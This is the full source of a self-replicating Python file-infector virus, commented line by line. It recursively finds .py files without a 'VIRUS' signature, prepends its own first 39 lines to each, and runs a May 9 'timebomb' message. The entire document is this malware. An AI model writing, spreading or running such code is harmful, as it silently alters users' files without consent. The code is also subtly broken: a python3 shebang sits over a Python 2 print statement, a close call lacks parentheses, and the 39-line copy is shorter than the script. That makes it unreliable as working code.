#!/usr/bin/python3
import os
import datetime

#Determines if file has been infected of not
SIGNATURE = "VIRUS"

#Function to locate files to infect
def locate(path):
    #Create an array
    files_targeted = []
    #Get a list of files in the given path.
    filelist = os.listdir(path)
    #Run this on all directories in path
    for fname in filelist:
        #If the item is a directory, run these commands 
        if os.path.isdir(path+"/"+fname):
            #Use the locate function to expand the list
            files_targeted.extend(locate(path+"/"+fname))
        #If the item is a python script, run these commands
        elif fname[-3:] == ".py":
            #Variable defaults to false
            infected = False
            #Read each file
            for line in open(path+"/"+fname):
                #Look for SIGNATURE
                if SIGNATURE in line:
                    #If SIGNATURE Ffound, set infected to true
                    infected = True
                    break
            #If no infection
            if infected == False:
                #Add file to list for infection
                files_targeted.append(path+"/"+fname)
    #Give the list to be infected
    return files_targeted

#Function to infect files
def infect(files_targeted):
    #Open curretn virus script
    virus = open(os.path.abspath(__file__))
    #Set empty variable
    virusstring = ""
    #For each line in the virus file
    for i,line in enumerate(virus):
        #If the current line is greater or equal to 0 and less than 39
        if i >= 0 and i < 39:
            #Add the line to the virus string
            virusstring += line
    #Close the virus file
    virus.close
    #For each file in the array
    for fname in files_targeted:
        #Open the file
        f = open(fname)
        #Put the current file contents into a variable
        temp = f.read()
        #Close the file
        f.close()
        #Open file for writing
        f = open(fname,"w")
        #Replace the file with the virus file lines, and then append
        f.write(virusstring + temp)
        #Close the file
        f.close()

#A timebomb print command
def detonate():
    #If the current date is May 9th, run the script
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print "You have been hacked"

#Target files in the current directory of the virus script
files_targeted = locate(os.path.abspath(""))

#Infect the files found in the above function
infect(files_targeted)

#Run detonate
detonate()